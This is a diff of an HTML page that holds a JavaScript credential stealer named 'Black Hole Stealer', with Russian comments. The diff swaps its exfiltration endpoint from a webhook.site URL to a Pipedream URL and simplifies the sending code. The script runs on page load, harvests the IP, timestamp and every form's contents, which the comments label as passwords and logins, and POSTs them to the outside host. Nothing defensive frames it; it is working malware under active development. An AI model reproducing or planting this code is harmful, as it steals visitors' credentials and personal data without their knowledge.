@@ -10,55 +10,32 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
 </head>
 <body>
 <script>
-// ===== BLACK HOLE STEALER - WEBHOOK (WORKING) =====
+// ===== BLACK HOLE STEALER - PIPEDREAM =====
 (function() {
-    const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
+    // ===== ТВОЙ PIPEDREAM ВЕБХУК =====
+    const WEBHOOK = 'https://eorw0sly29vshxa.m.pipedream.net';
     
-    // ===== ОТПРАВКА ЧЕРЕЗ FETCH (ПЫТАЕМСЯ) + IMAGE (ЗАПАСНОЙ) =====
+    // ===== ОТПРАВКА =====
     function send(data) {
-        const json = JSON.stringify(data);
-        const encoded = encodeURIComponent(json);
-        
-        // 1. Пробуем через fetch (если CORS пропустит)
         try {
             fetch(WEBHOOK, {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: json
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('[+] Data sent to Pipedream');
+                } else {
+                    console.log('[-] Failed to send data');
+                }
+            })
+            .catch(err => {
+                console.log('[-] Error: ' + err.message);
             });
-        } catch(e) {}
-        
-        // 2. ОТПРАВКА ЧЕРЕЗ IMAGE (РАБОТАЕТ ВСЕГДА)
-        try {
-            const img = new Image();
-            img.src = WEBHOOK + '?data=' + encoded;
-            img.style.display = 'none';
-            document.body.appendChild(img);
-        } catch(e) {}
-        
-        // 3. ОТПРАВКА ЧЕРЕЗ IFRAME (ЗАПАСНОЙ)
-        try {
-            const iframe = document.createElement('iframe');
-            iframe.src = WEBHOOK + '?data=' + encoded;
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-        } catch(e) {}
-        
-        // 4. ОТПРАВКА ЧЕРЕЗ FORM (ПОСЛЕДНИЙ ШАНС)
-        try {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = WEBHOOK;
-            form.style.display = 'none';
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.name = 'data';
-            input.value = json;
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-        } catch(e) {}
+        } catch(e) {
+            console.log('[-] Exception: ' + e.message);
+        }
     }
     
     // ===== IP =====
@@ -101,7 +78,7 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             timestamp: new Date().toISOString()
         };
         
-        // ===== FORMS =====
+        // ===== FORMS (passwords, logins) =====
         const forms = [];
         document.querySelectorAll('form').forEach(form => {
             const data = {};
@@ -145,7 +122,7 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             timestamp: new Date().toISOString()
         };
         
-        // ===== ОТПРАВКА =====
+        // ===== SEND =====
         send(log);
     }
 })();
